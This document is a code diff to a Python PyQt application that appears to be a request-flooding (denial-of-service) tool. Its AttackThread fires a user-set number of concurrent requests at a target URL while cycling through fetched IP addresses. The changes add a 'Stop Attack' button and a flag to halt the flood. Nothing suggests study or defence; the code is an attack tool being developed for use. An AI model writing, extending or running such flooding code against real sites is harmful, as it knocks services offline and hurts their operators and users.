@@ -50,6 +50,7 @@ class AttackThread(QThread):
         super().__init__()
         self.target_url = target_url
         self.num_requests = num_requests
+        self.is_attacking = True
 
     async def fetch_ip_addresses(self, url):
         async with aiohttp.ClientSession() as session:
@@ -83,11 +84,19 @@ class AttackThread(QThread):
     async def attack(self):
         ip_list = await self.get_all_ips()
         ip_cycle = itertools.cycle(ip_list)
-        semaphore = asyncio.Semaphore(100)  # Ограничиваем количество одновременных запросов
+        semaphore = asyncio.Semaphore(100)
         async with aiohttp.ClientSession() as session:
-            tasks = [self.send_request(session, next(ip_cycle), semaphore) for _ in range(self.num_requests)]
+            tasks = []
+            for i in range(self.num_requests):
+                if not self.is_attacking:
+                    break
+                task = self.send_request(session, next(ip_cycle), semaphore)
+                tasks.append(task)
             await asyncio.gather(*tasks)
         print("Attack completed.")
+
+    def stop(self):
+        self.is_attacking = False
 
     def run(self):
         asyncio.run(self.attack())
@@ -165,6 +174,19 @@ class MainWindow(QMainWindow):
         self.start_button.clicked.connect(self.start_attack)
         layout.addWidget(self.start_button)
 
+        self.stop_button = QPushButton("Stop Attack")
+        self.stop_button.setIcon(QIcon.fromTheme("media-playback-stop"))
+        self.stop_button.setStyleSheet("""
+            background-color: #444;
+            color: #ffffff;
+            padding: 10px;
+            font-weight: bold;
+            border: none;
+        """)
+        self.stop_button.clicked.connect(self.stop_attack)
+        self.stop_button.setEnabled(False)
+        layout.addWidget(self.stop_button)
+
         central_widget.setLayout(layout)
 
     def load_image(self, image_url):
@@ -206,7 +228,17 @@ class MainWindow(QMainWindow):
         self.attack_thread = AttackThread(target_url, num_requests)
         self.attack_thread.start()
 
+        self.start_button.setEnabled(False)
+        self.stop_button.setEnabled(True)
+
         QMessageBox.information(self, "Info", "Attack started. Check the terminal for logs.")
+
+    def stop_attack(self):
+        if self.attack_thread:
+            self.attack_thread.stop()
+            self.start_button.setEnabled(True)
+            self.stop_button.setEnabled(False)
+            QMessageBox.information(self, "Info", "Attack stopped.")
 
 app = QApplication(sys.argv)
 window = MainWindow()
